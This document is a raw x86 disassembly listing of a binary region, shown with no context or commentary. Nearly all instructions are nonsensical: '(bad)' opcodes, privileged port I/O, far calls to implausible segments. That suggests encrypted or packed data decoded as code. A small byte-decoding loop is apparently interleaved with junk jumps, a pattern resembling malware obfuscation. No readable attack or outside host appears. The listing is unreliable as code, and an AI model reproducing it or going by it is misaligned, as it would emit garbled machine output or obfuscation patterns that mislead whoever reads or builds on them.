  403927:	out    dx,eax
  403928:	cmp    BYTE PTR [ecx],dh
  40392a:	sahf   
  40392b:	imul   BYTE PTR [edi+0x6d]
  40392e:	cmc    
  40392f:	(bad)  
  403930:	das    
  403931:	test   BYTE PTR [ebp+eiz*1+0x1f045d5f],ch
  403938:	gs push cs
  40393a:	jmp    0x986bfee4
  40393f:	lahf   
  403940:	dec    esi
  403941:	scas   al,BYTE PTR es:[edi]
  403942:	icebp  
  403943:	cmp    al,BYTE PTR [edi+ecx*4]
  403946:	or     BYTE PTR [ecx+0x4e018ec8],bh
  40394c:	inc    eax
  40394d:	push   ds
  40394e:	cmc    
  40394f:	mov    ah,0xa
  403951:	aam    0xc7
  403953:	inc    edi
  403954:	xchg   esp,eax
  403955:	call   0xdad2:0x6e4195f8
  40395c:	fcom   DWORD PTR fs:[ecx]
  40395f:	jecxz  0x403910
  403961:	jbe    0x403905
  403963:	sub    eax,0x51fa272c
  403968:	sbb    BYTE PTR [edi+0x49565657],dl
  40396e:	sbb    al,0x37
  403970:	push   0x92682d86
  403975:	(bad)  
  403976:	push   ecx
  403977:	jne    0x4039e8
  403979:	addr16 cwde 
  40397b:	cld    
  40397c:	arpl   WORD PTR [eax-0x2a648e21],cx
  403982:	lds    ecx,FWORD PTR [ecx]
  403984:	pop    edx
  403985:	xchg   ebp,eax
  403986:	jo     0x4039fc
  403988:	rol    BYTE PTR [ecx+0x42],1
  40398b:	cli    
  40398c:	loope  0x4039ab
  40398e:	(bad)  [eax+0x76]
  403991:	out    dx,al
  403992:	push   ebp
  403993:	(bad)  [edi+0x753a4fa0]
  403999:	add    eax,0xf22a76d4
  40399e:	out    dx,al
  40399f:	dec    esi
  4039a0:	in     eax,dx
  4039a1:	xchg   ebx,eax
  4039a2:	mov    eax,0x7448ad60
  4039a7:	or     edx,DWORD PTR [esi+0xb]
  4039aa:	scas   eax,DWORD PTR es:[edi]
  4039ab:	in     al,dx
  4039ac:	push   edx
  4039ad:	mov    ebx,0xae36df70
  4039b2:	push   esp
  4039b3:	stos   DWORD PTR es:[edi],eax
  4039b4:	fstp   QWORD PTR [esp+eiz*8+0x1b260c8d]
  4039bb:	stc    
  4039bc:	sub    BYTE PTR [edi+edx*1-0x11],0xdc
  4039c1:	and    esp,DWORD PTR [esi]
  4039c3:	adc    BYTE PTR [ebx+0x5f],cl
  4039c6:	ja     0x4039c2
  4039c8:	mov    esp,0xeb17ba95
  4039cd:	cld    
  4039ce:	inc    esi
  4039cf:	ret    0x933f
  4039d2:	fisubr WORD PTR [ecx+0x434fa9ff]
  4039d8:	pop    ds
  4039d9:	jmp    DWORD PTR [ebx+edx*4]
  4039dc:	pop    ebx
  4039dd:	push   es
  4039de:	or     ebp,edi
  4039e0:	sub    eax,0xd79bfe74
  4039e5:	std    
  4039e6:	pop    esi
  4039e7:	popf   
  4039e8:	dec    edi
  4039e9:	push   edx
  4039ea:	cmp    BYTE PTR [ebp-0x5d958e01],al
  4039f0:	int    0x20
  4039f2:	into   
  4039f3:	fnstenv [eax-0x5f]
  4039f6:	scas   eax,DWORD PTR es:[edi]
  4039f7:	push   0x70f3c012
  4039fc:	dec    esi
  4039fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039fe:	mov    al,al
  403a00:	out    0xc9,al
  403a02:	mov    ah,0x15
  403a04:	loope  0x403a7d
  403a06:	neg    DWORD PTR [edx]
  403a08:	sub    bh,ch
  403a0a:	push   ebx
  403a0b:	lock ins BYTE PTR es:[edi],dx
  403a0d:	inc    edi
  403a0e:	es daa 
  403a10:	lahf   
  403a11:	mov    ch,0xd3
  403a13:	sub    al,0xb7
  403a15:	cli    
  403a16:	push   edi
  403a17:	scas   al,BYTE PTR es:[edi]
  403a18:	add    eax,0x20c95758
  403a1d:	(bad)  
  403a1f:	or     al,0x8c
  403a21:	mov    WORD PTR [eax+0x5f],ss
  403a24:	pop    ss
  403a25:	sbb    bh,al
  403a27:	cmp    BYTE PTR [eax],bl
  403a29:	cmc    
  403a2a:	jns    0x4039d5
  403a2c:	test   cl,0xec
  403a2f:	mov    DWORD PTR [edx-0x6cd7f448],edi
  403a35:	and    eax,0xbeea7c33
  403a3a:	inc    ebx
  403a3b:	push   eax
  403a3c:	and    al,0x7b
  403a3e:	call   0xac02:0xc1f61162
  403a45:	stc    
  403a46:	lea    esp,[ebx-0x41]
  403a49:	jecxz  0x4039eb
  403a4b:	mov    esp,0xbd3e1453
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	jo     0x403ae1
  403a66:	sub    cl,BYTE PTR [ecx+0x65]
  403a69:	push   ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403ad2
  403a71:	or     eax,0x8d3b6ace
  403a76:	cmp    BYTE PTR [edx-0x35],ah
  403a79:	out    dx,al
  403a7a:	out    0x42,al
  403a7c:	sbb    ebx,DWORD PTR [ebx+0x579c24d]
  403a82:	in     al,dx
  403a83:	mov    edx,0x39e19d8f
  403a88:	xor    ecx,esp
  403a8a:	les    ebx,FWORD PTR [ecx]
  403a8c:	call   0xe56925da
  403a91:	(bad)  
  403a92:	xor    BYTE PTR [edx+0xe17ed31],bh
  403a98:	dec    esp
  403a99:	dec    ebp
  403a9a:	push   ds
  403a9b:	in     eax,0x55
  403a9d:	int    0x1c
  403a9f:	mov    eax,ds:0x2da7a3f3
  403aa4:	mov    esi,0xcace1876
  403aa9:	popf   
  403aaa:	and    dh,BYTE PTR ds:0xe8de149e
  403ab0:	(bad)
  403ab3:	test   DWORD PTR [ecx],0x79cb1891
  403ab9:	test   eax,0x10b9de17
  403abe:	imul   esp,DWORD PTR [ecx-0x4f20b034],0xa1eafaaf
  403ac8:	cmp    BYTE PTR [ebp+0x38bd8bec],bl
  403ace:	or     al,0x9c
  403ad0:	adc    bl,BYTE PTR [ecx+edx*8+0x785966c8]
  403ad7:	in     eax,dx
  403ad8:	jns    0x403ae5
  403ada:	or     al,0x8d
  403adc:	push   0x7628c552
  403ae1:	mov    esp,DWORD PTR [edi+eax*1+0x6a]
  403ae5:	jmp    0x403ab3
  403ae7:	sbb    ecx,ebp
  403ae9:	mov    al,0xb0
  403aeb:	mov    ds:0x205b566a,al
  403af0:	jmp    0x603aa4e3
  403af5:	jae    0x403b3d
  403af7:	call   0x49924e64
  403afc:	stc    
  403afd:	xor    BYTE PTR [ecx-0x5],ah
  403b00:	pop    ebx
  403b01:	outs   dx,DWORD PTR ds:[esi]
  403b02:	in     al,0x2a
  403b04:	jmp    0x2ee9:0xf67fe2
  403b0b:	mov    esi,0x9a0ff7a2
  403b10:	xchg   ebx,eax
  403b11:	xchg   edi,eax
  403b12:	test   BYTE PTR [edi+0x52],0xb0
  403b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b17:	mov    dl,0x40
  403b19:	pop    ebp
  403b1a:	jecxz  0x403b72
  403b1c:	add    cl,BYTE PTR [eax+0x30950a4c]
  403b22:	dec    edi
  403b23:	iret   
  403b24:	daa    
  403b25:	lea    edi,[ecx-0x49885286]
  403b2b:	mov    dh,0x8d
  403b2d:	cmc    
  403b2e:	sbb    BYTE PTR [edi+0x5c],bl
  403b31:	mov    esp,0x99b867ae
  403b36:	jle    0x403b40
  403b38:	nop
  403b39:	cmp    DWORD PTR [edx+0x25ada195],eax
  403b3f:	adc    al,bh
  403b41:	imul   edi,eax,0xffffffec
  403b44:	mov    ch,0x7f
  403b46:	cmc    
  403b47:	gs xchg ebx,eax
  403b49:	sbb    DWORD PTR [ecx],edx
  403b4b:	repnz push edi
  403b4d:	lock or esp,DWORD PTR [ebx-0x4f]
  403b51:	cmp    BYTE PTR [esi+eiz*4-0xdcab901],cl
  403b58:	sub    al,0x3e
  403b5a:	xor    bh,al
  403b5c:	fwait
  403b5d:	ror    BYTE PTR ds:0x71a04e18,1
  403b63:	mov    dl,0x83
  403b65:	repnz add BYTE PTR [edx-0x6a84928a],dh
  403b6c:	pop    ss
  403b6d:	es push ds
  403b6f:	neg    DWORD PTR [esi]
  403b71:	mov    ?,WORD PTR [edi]
  403b73:	xchg   edi,eax
  403b74:	jecxz  0x403b25
  403b76:	aam    0x7f
  403b78:	inc    edx
  403b79:	inc    edx
  403b7a:	sbb    bh,bh
  403b7c:	imul   ecx,ecx,0x5a
  403b7f:	addr16 loop 0x403b07
  403b82:	push   es
  403b83:	popa   
  403b84:	fidivr DWORD PTR ds:0x13d15f97
  403b8a:	mul    eax
  403b8c:	js     0x403b4e
  403b8e:	cmp    ch,al
  403b90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b91:	jp     0x403c10
  403b93:	les    ebp,FWORD PTR [ebx+0x35ccff37]
  403b99:	int3   
  403b9a:	and    al,0x26
  403b9c:	ja     0x403b4d
  403b9e:	push   ss
  403b9f:	das    
  403ba0:	bnd jae 0x403baa
  403ba3:	mov    edi,0x3f83e70d
  403ba8:	mov    eax,ds:0x7215a99d
  403bad:	push   edi
  403bae:	stos   BYTE PTR es:[edi],al
  403baf:	inc    esp
  403bb0:	sub    eax,0xbf93242
  403bb5:	add    esp,DWORD PTR [eax]
  403bb7:	das    
  403bb8:	dec    edx
  403bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bba:	mov    WORD PTR [ebx],?
  403bbc:	imul   eax,DWORD PTR [edi-0x73c63272],0xffffff8e
  403bc3:	cmp    DWORD PTR cs:[edi+0x7f89da34],edx
  403bca:	sbb    ah,dl
  403bcc:	int3   
  403bcd:	in     al,0x3e
  403bcf:	mov    edx,edx
  403bd1:	mov    eax,cs:0xfe79a90c
  403bd7:	xchg   al,cl
  403bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bda:	sbb    al,dl
  403bdc:	out    dx,al
  403bdd:	jno    0x403ba9
  403bdf:	sub    al,0xd3
  403be1:	mov    ds:0xbc09c92a,eax
  403be6:	adc    BYTE PTR [esi+eax*8+0x68],bl
  403bea:	(bad)  
  403beb:	mov    ecx,0xfafddfef
  403bf0:	ins    BYTE PTR es:[edi],dx
  403bf1:	ror    BYTE PTR ds:0xfe9ab8d6,1
  403bf7:	sbb    edx,ecx
  403bf9:	iret   
  403bfa:	sbb    BYTE PTR [ebx],ah
  403bfc:	mov    esi,0x709418d5
  403c01:	jmp    0xb1d5a05b
  403c06:	and    al,0xf0
  403c08:	lahf   
  403c09:	stc    
  403c0a:	dec    ebx
  403c0b:	adc    bl,dl
  403c0d:	push   ds
  403c0e:	lods   al,BYTE PTR ds:[esi]
  403c0f:	or     al,0xb4
  403c11:	or     al,0x38
  403c13:	cs ss and eax,0xd7787bf1
  403c1a:	cmp    DWORD PTR [ecx-0x5c],edx
  403c1d:	mov    cl,0xb9
  403c1f:	ret    0x76d3
  403c22:	or     eax,0xa812d615
  403c27:	mov    al,0x6e
  403c29:	adc    ah,ah
  403c2b:	jg     0x403c39
  403c2d:	in     al,0x2a
  403c2f:	test   eax,0x552e5a6f
  403c34:	fcmovnbe st,st(0)
  403c36:	mov    ecx,0xab94179a
  403c3b:	inc    esp
  403c3c:	cmp    dh,bl
  403c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c3f:	das    
  403c40:	nop
  403c41:	pop    ss
  403c42:	xchg   ecx,eax
  403c43:	mov    BYTE PTR [ebp+0x50],ch
  403c46:	mov    ch,0xd7
  403c48:	ds pop ebx
  403c4a:	push   0xe853098f
  403c4f:	inc    edi
  403c50:	fist   WORD PTR [edx+edi*8]
  403c53:	mov    ch,0x1e
  403c55:	fcmovnu st,st(3)
  403c57:	pop    ebx
  403c58:	mov    edx,0x72183057
  403c5d:	dec    ebp
  403c5e:	xor    DWORD PTR [ebx],0x8bfe03f9
  403c64:	jne    0x403c6e
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0xa1830597
  403ca4:	xchg   DWORD PTR [edx+0x18],ecx
  403ca7:	jl     0x403d25
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403c64
  403cae:	sbb    esi,DWORD PTR [ecx]
  403cb0:	ds mov ebx,eax
  403cb3:	jmp    0x403d2d
  403cb5:	pop    ds
  403cb6:	clc    
  403cb7:	adc    al,0x6a
  403cb9:	iret   
  403cba:	scas   al,BYTE PTR es:[edi]
  403cbb:	ss adc eax,0x8256314
  403cc1:	outs   dx,BYTE PTR ds:[esi]
  403cc2:	lods   eax,DWORD PTR ds:[esi]
  403cc3:	test   eax,0x3ededb13
  403cc8:	xchg   edx,eax
  403cc9:	xor    al,BYTE PTR [ebx+0x56]
  403ccc:	dec    edi
  403ccd:	push   cs
  403cce:	jle    0x403c6d
  403cd0:	mov    ch,0x7f
  403cd2:	sub    al,0xd1
  403cd4:	test   DWORD PTR [ebx],ebp
  403cd6:	pop    esp
  403cd7:	sbb    eax,0xeb27c4ef
  403cdc:	(bad)  
  403cdd:	lahf   
  403cde:	sub    al,ch
  403ce0:	cli    
  403ce1:	push   esp
  403ce2:	mov    edi,ebx
  403ce4:	jecxz  0x403cfc
  403ce6:	iret   
  403ce7:	pushf  
  403ce8:	aad    0xaf
  403cea:	xchg   edx,eax
  403ceb:	(bad)  
  403cec:	mov    eax,0x1d1acab8
  403cf1:	(bad)  [ebx-0x9]
  403cf4:	fist   WORD PTR [eax+ebp*2+0x424118ed]
  403cfb:	pop    edi
  403cfc:	or     al,0x3b
  403cfe:	dec    esp
  403cff:	fsub   QWORD PTR [edx+esi*2+0x21]
  403d03:	sbb    bl,BYTE PTR [ebp+0x7bd30fe3]
  403d09:	xlat   BYTE PTR ds:[ebx]
  403d0a:	add    DWORD PTR [edx],ebx
  403d0c:	bound  edx,QWORD PTR [esi-0x26]
  403d0f:	add    BYTE PTR [ebx],ah
  403d11:	in     al,dx
  403d12:	neg    cl
  403d14:	arpl   WORD PTR [ebx],bp
  403d16:	dec    eax
  403d17:	test   al,0x42
  403d19:	(bad)  
  403d1a:	stc    
  403d1b:	rcl    DWORD PTR [ecx-0x339d9a27],cl
  403d21:	outs   dx,BYTE PTR ds:[esi]
  403d22:	loopne 0x403cda
  403d24:	jno    0x403d72
  403d26:	push   edi
  403d27:	sbb    eax,0x5b5a7317
  403d2c:	ins    BYTE PTR es:[edi],dx
  403d2d:	adc    DWORD PTR [edx],esp
  403d2f:	jmp    0x70a46089
  403d34:	fmul   DWORD PTR [esi+ecx*2]
  403d37:	mov    esi,0x9b71994b
  403d3c:	add    esi,DWORD PTR [ecx]
  403d3e:	inc    ebx
  403d3f:	cwde   
  403d40:	dec    esp
  403d41:	and    BYTE PTR [edx-0x8],0x35
  403d45:	dec    ebp
  403d46:	retf   
  403d47:	arpl   bx,cx
  403d49:	xor    al,0x49
  403d4b:	outs   dx,DWORD PTR ss:[esi]
  403d4d:	pop    esp
  403d4e:	xchg   esi,eax
  403d4f:	(bad)  
  403d50:	jp     0x403cf2
  403d52:	les    esi,FWORD PTR [ebx]
  403d54:	push   ecx
  403d55:	cmp    BYTE PTR [eax-0x52],cl
  403d58:	adc    eax,0x855eb921
  403d5d:	add    ebp,DWORD PTR [eax]
  403d5f:	sub    DWORD PTR [eax-0x23],ebx
  403d62:	ds jb  0x403dd5
  403d65:	pop    ecx
  403d66:	addr16 cld 
  403d68:	mov    edi,0x146e5aed
  403d6d:	dec    ebp
  403d6e:	fnstcw WORD PTR [ecx-0xb358254]
  403d74:	sbb    ecx,ebp
  403d76:	into   
  403d77:	lods   al,BYTE PTR ds:[esi]
  403d78:	or     eax,0xdb21584f
  403d7d:	retf   0x3f8
  403d80:	push   0x77055176
  403d85:	mov    ch,0x4d
  403d87:	out    dx,al
  403d88:	in     al,dx
  403d89:	sbb    al,0xb3
  403d8b:	mov    ah,0x96
  403d8d:	cli    
  403d8e:	xchg   edi,eax
  403d8f:	mov    edi,0x3771d94d
  403d94:	imul   eax,eax,0x3e
  403d97:	pop    edx
  403d98:	mov    ecx,0xa2387942
  403d9d:	pop    ebp
  403d9e:	xlat   BYTE PTR ds:[ebx]
  403d9f:	enter  0x6ca4,0xfb
  403da3:	jae    0x403d50
  403da5:	sbb    ebp,ecx
  403da7:	neg    DWORD PTR [ebx-0x7278f3c4]
  403dad:	call   0x8f4fbacf
  403db2:	xor    eax,edx
  403db4:	nop
  403db5:	pop    ss
  403db6:	xchg   ecx,eax
  403db7:	and    DWORD PTR [ebx],0x36
  403dba:	cmp    ch,bh
  403dbc:	popf   
  403dbd:	sar    BYTE PTR [edi+0x73],0xa8
  403dc1:	outs   dx,BYTE PTR ds:[esi]
  403dc2:	neg    BYTE PTR [edi+0x12e5f176]
  403dc8:	xchg   esi,eax
  403dc9:	mov    eax,0xc3c446ad
  403dce:	or     esp,DWORD PTR [esi+0x3a]
  403dd1:	or     cl,ch
  403dd3:	cdq    
  403dd4:	push   ecx
  403dd5:	aas    
  403dd6:	dec    esp
  403dd7:	inc    esi
  403dd8:	stc    
  403dd9:	inc    dl
  403ddb:	sub    BYTE PTR [ecx+0x3f],0x21
  403ddf:	test   al,0x9d
  403de1:	mov    esp,ss
  403de3:	loope  0x403e1f
  403de5:	sub    al,BYTE PTR [eax]
  403de7:	sub    ebx,DWORD PTR [ebx+0x4cb0b955]
  403ded:	xor    al,0x7f
  403def:	into   
  403df0:	inc    ecx
  403df1:	cld    
  403df2:	int    0xe2
  403df4:	xchg   edi,eax
  403df5:	xchg   BYTE PTR [edx],dh
  403df7:	jns    0x403d9e
  403df9:	jo     0x403dc5
  403dfb:	retf   
  403dfc:	shl    DWORD PTR [esi+0x1f3513fb],0x8c
  403e03:	mov    esp,0x412be085
  403e08:	inc    ecx
  403e09:	sti    
  403e0a:	jge    0x403dea
  403e0c:	scas   eax,DWORD PTR es:[edi]
  403e0d:	jl     0x403e32
  403e0f:	leave  
  403e10:	mov    ch,0xdd
  403e12:	add    BYTE PTR [eax+0x6a],0xf2
  403e16:	call   0xbf06:0x8279f871
  403e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e1e:	scas   eax,DWORD PTR es:[edi]
  403e1f:	or     DWORD PTR [edx-0x24],esi
  403e22:	mov    BYTE PTR [ebx],cl
  403e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e25:	mov    ebx,0xaf3738aa
  403e2a:	int3   
  403e2b:	sbb    BYTE PTR [ebx+0x7e],dh
  403e2e:	test   al,0xda
  403e30:	popa   
  403e31:	ja     0x403e02
  403e33:	stos   DWORD PTR es:[edi],eax
  403e34:	add    al,0xc3
  403e36:	xor    DWORD PTR [ecx-0x69],edx
  403e39:	add    eax,0x62bfd134
  403e3e:	ret    0x1734
  403e41:	push   ebx
  403e42:	leave  
  403e43:	cmp    DWORD PTR [ebx-0x22],ebp
  403e46:	sbb    dl,BYTE PTR [edi-0x42]
  403e49:	out    0x67,eax
  403e4b:	mov    DWORD PTR [esi-0x5c],esp
  403e4e:	neg    DWORD PTR [ebp+0x7a8112fc]
  403e54:	popf   
  403e55:	mov    ebp,0x245d22aa
  403e5a:	test   BYTE PTR [ecx-0x3b],bl
  403e5d:	test   al,0xb8
  403e5f:	or     DWORD PTR [esi-0x5f72bb52],edx
  403e65:	test   BYTE PTR [esi+0x6f],al
  403e68:	adc    DWORD PTR [edx+0x33ef9c51],0x2da840dc
  403e72:	je     0x403e34
  403e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e75:	aaa    
  403e76:	outs   dx,BYTE PTR ds:[esi]
  403e77:	mov    ds:0xb88735d3,eax
  403e7c:	ins    BYTE PTR es:[edi],dx
  403e7d:	imul   edx,DWORD PTR [edi],0xb0cbc7c6
  403e83:	xor    al,0x2b
  403e85:	dec    edi
  403e86:	dec    edi
  403e87:	pop    ss
  403e88:	fidiv  WORD PTR [esi]
  403e8a:	aaa    
  403e8b:	jne    0x403ecf
  403e8d:	jns    0x403e65
  403e8f:	xor    ebx,DWORD PTR ds:0xbb39d98f
  403e95:	leave  
  403e96:	cmp    DWORD PTR [edx-0x3a],ebx
  403e99:	pop    edi
  403e9a:	sub    al,0xef
  403e9c:	sub    esi,eax
  403e9e:	add    esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x5c866d36
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f14
  403ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ee8:	mov    dh,0x0
  403eea:	lods   al,BYTE PTR ds:[esi]
  403eeb:	sbb    eax,0x2dbe5a9f
  403ef0:	stos   DWORD PTR es:[edi],eax
  403ef1:	jne    0x403ec8
  403ef3:	sub    DWORD PTR [di-0x7c],ecx
  403ef7:	jnp    0x403f63
  403ef9:	jnp    0x403ec9
  403efb:	rcl    DWORD PTR [esi-0x76ecf7cf],0x37
  403f02:	xor    BYTE PTR [ecx],bl
  403f04:	leave  
  403f05:	sahf   
  403f06:	inc    ebp
  403f07:	sub    DWORD PTR [ecx],edx
  403f09:	imul   eax,DWORD PTR [edi],0xf188de6
  403f0f:	mov    bl,0x33
  403f11:	mov    al,ds:0xe02593fc
  403f16:	popa   
  403f17:	retf   
  403f18:	sbb    eax,0x56abb569
  403f1d:	mov    ebx,DWORD PTR [esi+0x61]
  403f20:	jnp    0x403f0b
  403f22:	out    dx,al
  403f23:	jmp    0x403f60
  403f25:	daa    
  403f26:	sub    BYTE PTR [ecx+0x64],dl
  403f29:	das    
  403f2a:	mov    ecx,0xf9278ad4
  403f2f:	shl    DWORD PTR [ebp+0x45],0xae
  403f33:	iret   
  403f34:	or     eax,0x771b4a58
  403f39:	pop    ss
  403f3a:	shl    DWORD PTR [ebp+esi*8-0x5612765f],1
  403f41:	rol    DWORD PTR [edi+0x7f],1
  403f44:	mov    esp,0x5ff97491
  403f49:	aas    
  403f4a:	fst    QWORD PTR [eax+0x3]
  403f4d:	icebp  
  403f4e:	sub    edx,DWORD PTR [ecx]
  403f50:	lock stos DWORD PTR es:[edi],eax
  403f52:	dec    edi
  403f53:	or     ecx,DWORD PTR [edx-0x1]
  403f56:	push   ds
  403f57:	into   
  403f58:	inc    edx
  403f59:	push   es
  403f5a:	(bad)  
  403f5b:	and    al,0x5c
  403f5d:	dec    esp
  403f5e:	cwde   
  403f5f:	jb     0x403f2f
  403f61:	xchg   cl,ch
  403f63:	outs   dx,BYTE PTR ds:[esi]
  403f64:	mov    esp,0xf549a332
  403f69:	mov    ah,0x8a
  403f6b:	cmp    BYTE PTR [edx+0x77a2e067],cl
  403f71:	fistp  WORD PTR [esi+0x5e]
  403f74:	ss clc 
  403f76:	retf   0x6eff
  403f79:	xor    al,0x53
  403f7b:	cmp    esi,DWORD PTR [ebx-0x5b]
  403f7e:	lea    esp,[ecx-0x7d]
  403f81:	and    BYTE PTR cs:[edx-0x3e],dl
  403f85:	jno    0x403f8c
  403f87:	(bad)  
  403f88:	jb     0x403f7f
  403f8a:	sbb    BYTE PTR [edi+0x74],cl
  403f8d:	sti    
  403f8e:	outs   dx,DWORD PTR ds:[esi]
  403f8f:	mov    ecx,0x4f4cd391
  403f94:	arpl   ax,si
  403f96:	sbb    al,0xe0
  403f98:	shl    DWORD PTR ds:0xb4816251,cl
  403f9e:	jno    0x403f35
  403fa0:	leave  
  403fa1:	and    edi,DWORD PTR [edi]
  403fa3:	cs push esi
  403fa5:	sbb    bl,BYTE PTR ds:0x28ab8c88
  403fab:	jnp    0x403f6f
  403fad:	adc    eax,0x3d4e3195
  403fb2:	(bad)  
  403fb3:	fsincos 
  403fb5:	jmp    0x404027
  403fb7:	adc    eax,0x3cd56ba
  403fbc:	mov    esp,0x18179d55
  403fc1:	xor    DWORD PTR [edi-0x5c5a75de],esp
  403fc7:	pushf  
  403fc8:	mov    bh,0x1f
  403fca:	pop    esi
  403fcb:	nop
  403fcc:	pop    edx
  403fcd:	rcr    DWORD PTR [edx+0x65],cl
  403fd0:	adc    eax,0x9c145e2b
  403fd5:	jno    0x403fc5
  403fd7:	retf   0x8244
  403fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fdb:	adc    DWORD PTR [ecx],0x8cd6b98a
  403fe1:	shr    eax,0x1c
  403fe4:	push   0x51
  403fe6:	lea    edi,[ebp-0x63ef9a39]
  403fec:	mov    esp,0xcfc75a48
  403ff1:	jnp    0x403fb4
  403ff3:	push   edx
  403ff4:	addr16 repnz push es
  403ff7:	pop    esp
  403ff8:	popa   
  403ff9:	adc    ecx,DWORD PTR [esp+esi*1+0x34]
  403ffd:	xor    BYTE PTR [ebx],0xb0
  404000:	mov    cl,0xc3
  404002:	std    
  404003:	aaa    
  404004:	pop    eax
  404005:	ror    edx,cl
  404007:	repnz mov ds:0x3a9f86bd,al
  40400d:	fwait
  40400e:	jb     0x404017
  404010:	inc    edx
  404011:	mov    dl,0x6e
  404013:	out    dx,eax
  404014:	xchg   ebx,eax
  404015:	sbb    ecx,DWORD PTR [eax]
  404017:	mov    BYTE PTR [edi+edx*4],ah
  40401a:	cmp    ah,BYTE PTR [eax+ebp*8+0x3a]
  40401e:	xor    eax,0xe0171d85
  404023:	ficom  WORD PTR [edx-0x6d]
  404026:	inc    eax
  404027:	jb     0x403ff8
  404029:	sub    dl,BYTE PTR [ecx+0x51]
  40402c:	imul   edx,esi,0x3dc9cf6d
  404032:	and    DWORD PTR [esi],esp
  404034:	xchg   DWORD PTR [esi],ecx
  404036:	xor    ecx,DWORD PTR [edi+0x49]
  404039:	mov    dl,0xb8
  40403b:	or     eax,0xf953402d
  404040:	xchg   edx,eax
  404041:	push   edx
  404042:	(bad)  
  404043:	mov    ebp,0x545a2d18
  404048:	in     al,0x76
  40404a:	popa   
  40404b:	fdiv   DWORD PTR [ebx+edi*2+0x34]
  40404f:	sbb    eax,0x23edbfb2
  404054:	and    BYTE PTR [edi-0x520b68ec],dl
  40405a:	or     al,0xa3
  40405c:	xchg   ebp,eax
  40405d:	cwde   
  40405e:	pop    esp
  40405f:	pop    es
  404060:	shl    BYTE PTR [ebp+0x59c1b694],0x9c
  404067:	sub    BYTE PTR [edi+0x4bcca1ba],cl
  40406d:	sbb    al,BYTE PTR gs:[edi+0x20]
  404071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404072:	sbb    DWORD PTR [eax+0x5f742417],edi
  404078:	pop    esp
  404079:	add    BYTE PTR [esi],ch
  40407b:	int    0xcd
  40407d:	sub    al,0x9a
  40407f:	mov    ah,0xc6
  404081:	clc    
  404082:	add    BYTE PTR [si+0x1686],al
  404087:	(bad)  [esi+eiz*8-0x1371e61a]
  40408e:	loopne 0x4040ba
  404090:	addr16 sti 
  404092:	pusha  
  404093:	sbb    al,ch
  404095:	add    DWORD PTR [ebx],esi
  404097:	(bad)  
  404098:	pushf  
  404099:	hlt    
  40409a:	bound  edx,QWORD PTR [ecx+0x7d]
  40409d:	or     dh,bl
  40409f:	out    0x2c,al
  4040a1:	popa   
  4040a2:	nop
  4040a3:	pop    es
  4040a4:	lea    edi,[ebx+0x31]
  4040a7:	inc    eax
  4040a8:	fst    DWORD PTR [edi]
  4040aa:	popa   
  4040ab:	cdq    
  4040ac:	int    0x25
  4040ae:	retf   0x94b2
  4040b1:	clc    
  4040b2:	in     eax,0x9c
  4040b4:	cwde   
  4040b5:	out    dx,eax
  4040b6:	mov    ebp,0x6a6be33d
  4040bb:	int    0xce
  4040bd:	imul   edi,DWORD PTR [ecx+0x4f4b44d4],0xffffff90
  4040c4:	fisub  DWORD PTR [esi+0x33860023]
  4040ca:	jbe    0x404059
  4040cc:	pusha  
  4040cd:	icebp  
  4040ce:	mov    edi,0x3ab3cfec
  4040d3:	pusha  
  4040d4:	and    al,BYTE PTR [ecx+0x161d8fc9]
  4040da:	or     DWORD PTR [ebx+0x18c25dc1],0xec8b5500
  4040e4:	sub    esp,0x58
